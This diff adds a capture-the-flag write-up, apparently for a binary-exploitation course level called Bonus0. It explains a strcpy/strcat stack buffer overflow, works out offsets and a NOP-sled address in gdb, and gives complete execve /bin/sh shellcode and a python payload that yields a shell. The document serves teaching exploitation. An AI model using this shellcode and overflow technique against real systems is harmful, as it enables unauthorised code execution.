@@ -1,0 +1,171 @@
+# Bonus0 - Buffer Overflow (Stack + NOP Sled)
+
+## Context
+
+The program reads two inputs with `read()` then concatenates them with `strcpy` and `strcat` without size check. By overflowing the destination buffer, we overwrite the return address to redirect execution to our shellcode stored in `p()`'s large temporary buffer on the stack.
+
+---
+
+## Program flow
+
+```c
+main()
+  → pp(dest)          // concatenates two inputs into dest
+      → p(local_34)   // reads input 1, strncpy 20 bytes
+      → p(local_20)   // reads input 2, strncpy 20 bytes
+      → strcpy(dest, local_34)   // no size check !
+      → dest[strlen] = ' '       // adds space
+      → strcat(dest, local_20)   // no size check !
+```
+
+---
+
+## Why p()'s large buffer matters
+
+```asm
+sub $0x1018,%esp          ; allocates 4096 bytes temporary buffer
+read(0, buffer, 0x1000)   ; reads up to 4096 bytes
+strncpy(dest, buffer, 20) ; copies only 20 bytes to dest
+```
+
+```
+p() temporary buffer = 4096 bytes at 0xbfffe680
+strncpy copies only 20 bytes → rest stays in large buffer !
+```
+
+The shellcode placed beyond 20 bytes **remains in memory** on the stack after `p()` returns — we can jump there !
+
+---
+
+## Memory layout
+
+### Stack during pp()
+
+```
+ebp-0x30 = local_34  [20 bytes]  ← input 1, strncpy destination
+ebp-0x1c = local_20  [20 bytes]  ← input 2, strncpy destination
+ebp-0x08 = saved edi
+ebp-0x04 = saved ebx
+ebp+0x00 = saved ebp
+ebp+0x04 = return address        ← we overwrite this
+```
+
+### dest in main()
+
+```asm
+sub $0x40,%esp
+lea 0x16(%esp),%eax   ; dest = esp+0x16
+```
+
+```
+dest        = 0xbffff736  (seen in ltrace)
+return addr = 0xbffff73c + 4 = 0xbffff740
+distance    = 54 bytes
+
+20 (local_34) + 1 (space) = 21 bytes already written
+54 - 21 = 33 bytes from local_20
+33 - 20 (local_20) = 13 bytes padding before return address
+13 - 4 (address) = 9 bytes before address
+```
+
+---
+
+## p() large buffer address
+
+```bash
+(gdb) b *p+50
+(gdb) r
+(gdb) x $ebp-0x1008
+# → 0xbfffe680  ← large buffer starts here
+```
+
+With 200 NOP + shellcode in input 1 :
+
+```
+0xbfffe680 : \x90 * 200   ← NOP sled
+0xbfffe748 : shellcode     ← execve /bin/sh
+```
+
+Target address in NOP sled :
+```
+0xbfffe680 + 0x90 = 0xbfffe710  ← safe landing in NOP sled
+```
+
+---
+
+## Why 200 NOP bytes
+
+```
+strncpy copies 20 bytes → local_34 = \x90 * 20
+remaining in large buffer = \x90 * 180 + shellcode
+
+0xbfffe680 : NOP sled starts
+0xbfffe680 + 200 = 0xbfffe748 : shellcode starts
+
+target 0xbfffe710 → lands in NOP sled → slides to shellcode ✓
+```
+
+More NOPs = bigger landing zone = more reliable exploit.
+
+---
+
+## Payload structure
+
+### Input 1 : NOP sled + shellcode
+
+```
+\x90 * 200 + \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+```
+
+```
+strncpy keeps first 20 bytes → local_34 = \x90 * 20
+rest stays in large buffer   → NOP * 180 + shellcode at 0xbfffe680
+```
+
+### Input 2 : padding + return address
+
+```
+'A' * 9 + \x10\xe7\xff\xbf + 'B' * 7
+```
+
+```
+'A' * 9           →  fills up to return address offset
+\x10\xe7\xff\xbf  →  0xbfffe710 in little endian → NOP sled address
+'B' * 7           →  extra padding after return address
+```
+
+---
+
+## Full execution flow
+
+```
+1. p() input1  → large buffer = NOP*200 + shellcode
+                 local_34     = NOP*20 (strncpy)
+2. p() input2  → local_20     = 'A'*9 + addr + 'B'*7
+3. strcpy()    → dest         = NOP*20
+4. strcat()    → dest         = NOP*20 + ' ' + 'A'*9 + addr + 'B'*7
+                 overflows dest → overwrites return address
+5. ret         → jumps to 0xbfffe710
+6. NOP sled    → slides to shellcode at 0xbfffe748
+7. shellcode   → execve("/bin/sh")
+8.             → shell !
+```
+
+---
+
+## Final payload
+
+```bash
+((python -c "print('\x90'*200 + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')");
+ (python -c "print('A'*9 + '\x10\xe7\xff\xbf' + 'B'*7)");
+ cat -) | ./bonus0
+```
+
+---
+
+## Result
+
+```bash
+whoami
+bonus1    ← shell obtained !
+```
